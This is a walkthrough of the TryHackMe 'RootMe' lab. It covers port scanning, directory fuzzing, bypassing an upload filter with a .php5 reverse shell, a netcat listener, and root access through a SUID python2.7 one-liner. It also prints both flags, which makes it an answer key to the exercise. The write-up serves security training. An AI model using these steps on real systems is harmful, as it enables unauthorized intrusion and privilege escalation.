# RootMe — TryHackMe Walkthrough  

<img width="1892" height="364" alt="Screenshot 2025-12-03 215458" src="https://github.com/user-attachments/assets/643d6799-40c1-4765-965c-df1eb0dd8c3a" />


The box greets us with a simple line: *“Can you root me?”* Looks harmless, but we know better. Time to peel back the layers and see what’s hiding underneath.

---

## Task 1: Reconnaissance  

First move: nmap. I scanned the target with service detection enabled.  

```bash
nmap 10.49.166.159 -sV
```

<img width="800" height="225" alt="Screenshot 2025-12-03 195148" src="https://github.com/user-attachments/assets/39520301-1011-484e-ba3b-81cee2636119" />


Results came back quickly:  
- **22/tcp** — SSH (OpenSSH 8.2p1 Ubuntu)  
- **80/tcp** — HTTP (Apache 2.4.41)  

**Q. Scan the machine, how many ports are open?**  
: 2  

**Q. What version of Apache is running?**  
: 2.4.41  

**Q. What service is running on port 22?**  
: ssh  

The web page itself was barebones. No obvious entry points.


<img width="1920" height="1080" alt="Screenshot_2025-12-03_19_50_17" src="https://github.com/user-attachments/assets/2540fc14-d122-4be7-b5ba-1ca1d3ff3c94" />


That meant it was time to fuzz for hidden directories.

I fired up `ffuf` with the big wordlist:  

```bash
ffuf -u http://10.49.166.159/FUZZ -w /usr/share/wordlists/dirb/big.txt -t 100
```


<img width="892" height="527" alt="Screenshot 2025-12-03 215143" src="https://github.com/user-attachments/assets/c3ba5c4e-9ecb-401e-a90c-23fa3b91355b" />


Endpoints popped up: `.htpasswd`, `.htaccess`, `/uploads`, and most importantly — `/panel/`. That looked promising.  

**Q. What is the hidden directory?**  
: /panel/  

---

## Task 2: Getting a Shell  

Inside `/panel/` was a file upload form. Classic. I tried dropping in a PHP reverse shell from [Pentestmonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell), but `.php` was blocked.  

So I tested alternative extensions. `.php5` slipped through.


<img width="928" height="703" alt="Screenshot 2025-12-03 213609" src="https://github.com/user-attachments/assets/579f1ced-2e17-43ce-a2e1-ee6c7db769c9" />


Uploaded the shell and accessed the file in `/uploads`.  


<img width="884" height="455" alt="Screenshot 2025-12-03 213602" src="https://github.com/user-attachments/assets/bd65984c-b153-4c18-8d15-9449e4960941" />


before that, set up a netcat listener :

```bash
nc -lvnp 3713
```

Connection landed. Shell as `www-data`. Upgraded with Python pty for a proper interactive session.  

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```


<img width="828" height="343" alt="Screenshot 2025-12-03 213819" src="https://github.com/user-attachments/assets/3e172b84-ccfe-4a31-9b14-b30bd0e77ae4" />



Started exploring. In `/var/www/` I found `user.txt`.  

```bash
cat /var/www/user.txt
```


<img width="465" height="257" alt="Screenshot 2025-12-03 214310" src="https://github.com/user-attachments/assets/29413c5e-90bc-46ff-b2c7-5f929ecc74f0" />


**Q. user.txt**  
: THM{y0u_g0t_a_sh3ll}  

---

## Task 3: Privilege Escalation  

Hints pointed toward SUID binaries. I checked with:  

```bash
find / -perm -4000 -type f 2>/dev/null
```

<img width="580" height="748" alt="Screenshot 2025-12-03 214543" src="https://github.com/user-attachments/assets/775e6faa-6dcd-4a95-8787-62b45f9e2e85" />


Lots of usual suspects, but one stood out: `/usr/bin/python2.7`. That’s unusual.  

**Q. Search for files with SUID permission, which file is weird?**  
: /usr/bin/python  

I looked up privesc techniques for Python SUID binaries. Found the trick:  

```bash
python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

Ran it. Dropped straight into a root shell.  


<img width="801" height="110" alt="Screenshot 2025-12-03 215025" src="https://github.com/user-attachments/assets/f7cf817d-e6a2-4b93-8134-806d5c118e8d" />


Navigated to `/root` and grabbed the flag.  

```bash
cat /root/root.txt
```


<img width="275" height="154" alt="Screenshot 2025-12-03 215123" src="https://github.com/user-attachments/assets/af8b35e9-4406-44a0-a366-292857bc638f" />


**Q. root.txt**  
: THM{pr1v1l3g3_3sc4l4t10n}  

---


RootMe played out like a classic beginner boot2root: recon gave us the map, fuzzing uncovered the panel, upload bypass landed the shell, and a sneaky Python SUID binary handed us root. Each step stacked neatly into the next, and before long the box was ours. 

Challenge complete, flags secured.  


